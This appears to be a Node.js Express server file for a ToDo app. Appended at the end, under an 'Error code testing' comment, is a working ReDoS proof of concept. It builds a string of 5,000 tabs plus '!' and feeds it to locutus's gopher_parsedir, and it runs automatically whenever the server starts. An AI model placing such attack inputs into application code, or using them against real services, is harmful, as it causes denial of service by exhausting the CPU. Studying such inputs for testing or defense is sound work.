const express = require('express')
const cors = require('cors')
const helmet = require('helmet')
require('./db/mongoose')
const todoRoutes = require('./routes/todo-routes')
const userRoutes = require('./routes/user-routes')
const errorRoutes = require('./routes/error-routes')
let cookieParser = require('cookie-parser')

const app = express()
const port = process.env.PORT || 5000

const corsOptions = {
  origin: process.env.CLIENT,
  //origin: '*',
  credentials: true,
}

app.use(express.json())
app.use(cors(corsOptions))

app.use(cookieParser())

app.use(helmet())
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
    },
  })
)

app.use(todoRoutes)
app.use(userRoutes)
app.use(errorRoutes)

app.listen(port, () => {
  console.log('ToDo server is up on port ' + port)
})

/** Error code testing **/
var gopher_parsedir = require('locutus/php/net-gopher/gopher_parsedir')
function build_attack(n) {
  var ret = ''
  for (var i = 0; i < n; i++) {
    ret += '\t'
  }
  return ret + '!'
}

var attack_str = build_attack(5000)
// var entry = gopher_parsedir('0All about my gopher site.\t/allabout.txt\tgopher.example.com\t70\u000d\u000a')
var entry = gopher_parsedir(attack_str)
/** Error code testing **/
